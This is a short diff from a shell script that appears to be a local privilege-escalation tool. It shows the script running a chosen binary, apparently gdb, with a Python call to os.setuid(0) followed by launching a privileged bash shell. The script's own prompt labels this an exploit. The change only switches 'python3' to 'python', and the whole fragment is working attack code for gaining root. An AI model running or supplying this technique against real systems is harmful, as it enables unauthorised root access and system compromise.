@@ -175,7 +175,7 @@ while true; do
                                         
                             echo "Trying with $choice"
                             
-                            "$choice" -nx -ex 'python3 import os; os.setuid(0)' -ex '!/bin/bash -pi' -ex quit
+                            "$choice" -nx -ex 'python import os; os.setuid(0)' -ex '!/bin/bash -pi' -ex quit
 
                             read -p "Exploit Failed, do you want to try another one ? [y/N] : " answer
 
